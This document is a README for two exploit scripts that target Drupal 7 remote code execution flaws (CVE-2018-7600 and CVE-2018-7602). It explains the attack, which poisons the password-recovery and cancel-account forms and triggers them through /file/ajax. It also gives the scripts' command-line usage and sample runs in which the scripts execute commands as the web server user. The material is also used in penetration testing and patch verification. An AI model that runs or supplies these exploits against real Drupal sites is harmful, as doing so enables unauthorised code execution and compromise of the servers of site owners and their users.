# Drupal 7 (CVE-2018-7600 / SA-CORE-2018-002)

Install required libraries with:

```
pip install requests
pip install bs4
```

```
$ python3 drupa7-CVE-2018-7600.py -h

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

usage: drupa7-CVE-2018-7600.py [-h] [-c COMMAND] [-f FUNCTION] [-p PROXY]
                               target

positional arguments:
  target                            URL of target Drupal site (ex:
                                    http://target.com/)

optional arguments:
  -h, --help                        show this help message and exit
  -c COMMAND, --command COMMAND     Command to execute (default = id)
  -f FUNCTION, --function FUNCTION  Function to use as attack vector (default
                                    = passthru)
  -p PROXY, --proxy PROXY           Configure a proxy in the format
                                    http://127.0.0.1:8080/ (default = none)

This script will exploit the (CVE-2018-7600) vulnerability in Drupal 7 <= 7.57
by poisoning the recover password form (user/password) and triggering it with
the upload file via ajax (/file/ajax).

```


```

$ python3 drupa7-CVE-2018-7600.py http://target.local/

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-xpkEuQSuJJJQ1y4Sfs8gs0zzsVdO_v_TpaJDBSehzJE
[*] Triggering exploit to execute: id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# Drupal 7 (CVE-2018-7602 / SA-CORE-2018-004)

Install required libraries with:

```
pip install requests
pip install bs4
```

```
$ python3 drupa7-CVE-2018-7602.py -h

===================================================================================
|   DRUPAL 7 <= 7.58 REMOTE CODE EXECUTION (SA-CORE-2018-004 / CVE-2018-7602)     |
|                                   by pimps                                      |
===================================================================================

usage: drupa7-CVE-2018-7602.py [-h] [-c COMMAND] [-f FUNCTION] [-x PROXY]
                               user password target

positional arguments:
  user                              Username
  password                          Password
  target                            URL of target Drupal site (ex:
                                    http://target.com/)

optional arguments:
  -h, --help                        show this help message and exit
  -c COMMAND, --command COMMAND     Command to execute (default = id)
  -f FUNCTION, --function FUNCTION  Function to use as attack vector (default
                                    = passthru)
  -x PROXY, --proxy PROXY           Configure a proxy in the format
                                    http://127.0.0.1:8080/ (default = none)

This script will exploit the (CVE-2018-7602) vulnerability in Drupal 7 <= 7.58
using an valid account and poisoning the cancel account form
(user_cancel_confirm_form) with the 'destination' variable and triggering it
with the upload file via ajax (/file/ajax).

```


```

$ python3 drupa7-CVE-2018-7602.py marcio2 teste123 http://127.0.0.1:9090/

===================================================================================
|   DRUPAL 7 <= 7.58 REMOTE CODE EXECUTION (SA-CORE-2018-004 / CVE-2018-7602)     |
|                                   by pimps                                      |
===================================================================================

[*] Creating a session using the provided credential...
[*] Finding User ID...
[*] User ID found: user/4
[*] Poisoning a form using 'destination' and including it in cache.
[*] Poisoned form ID: form-hKyeyIYxk-e4qT1sdZ6nWHq0xuHcH2BMWk3vMWaSExU
[*] Triggering exploit to execute: id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```
